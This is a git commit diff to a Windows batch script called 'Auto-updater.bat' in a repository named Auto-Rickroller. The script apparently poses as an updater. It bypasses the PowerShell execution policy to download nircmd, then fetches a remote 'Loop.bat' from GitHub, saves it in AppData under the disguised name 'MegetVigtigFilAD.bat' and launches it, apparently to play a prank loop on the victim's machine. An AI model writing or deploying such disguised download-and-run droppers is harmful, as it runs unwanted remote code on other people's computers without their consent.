3f4fc148f015f019993a44b32a2056a92b4193a3
patr824a <patr824a@gmail.com>
2025-03-14 13:11:22 +0100

    Update Auto-updater.bat
    Optimised the script and added an if-statement to avoid replacing nircmd.exe if it is already installed.

--- Chrome/Auto-updater.bat
+++ Chrome/Auto-updater.bat
@@ -3,20 +3,20 @@
 set "nircmd_url=https://www.nirsoft.net/utils/nircmd.zip"
 set "nircmd_zip=%USERPROFILE%\Downloads\nircmd.zip"
 set "nircmd_extract=%USERPROFILE%\Downloads\nircmd"
-set "nircmd_exe=%nircmd_extract%\nircmd.exe"
 set "nircmd_path=%USERPROFILE%\AppData\Local"
 set "bat_url=https://raw.githubusercontent.com/patr824a/Auto-Rickroller/refs/heads/main/Chrome/Loop.bat"
 set "bat_path=%USERPROFILE%\AppData\Local\MegetVigtigFilAD.bat"
 
-powershell -NoProfile -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile('%nircmd_url%', '%nircmd_zip%')"
+if not exist "%nircmd_path%" (
+  powershell -NoProfile -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile('%nircmd_url%', '%nircmd_zip%')"
+  powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%nircmd_zip%' -DestinationPath '%nircmd_extract%'"
+  copy "%nircmd_extract%\nircmd.exe" "%nircmd_path%"
+  del "%nircmd_zip%"
+  rd /s /q "%nircmd_extract%"
 
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%nircmd_zip%' -DestinationPath '%nircmd_extract%'"
-
-copy "%nircmd_exe%" "%nircmd_path%"
-
-del "%nircmd_zip%"
-rd /s /q "%nircmd_extract%"
+) else (
+    
+)
 
 powershell -NoProfile -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile('%bat_url%', '%bat_path%')"
-
 start "" "%bat_path%"
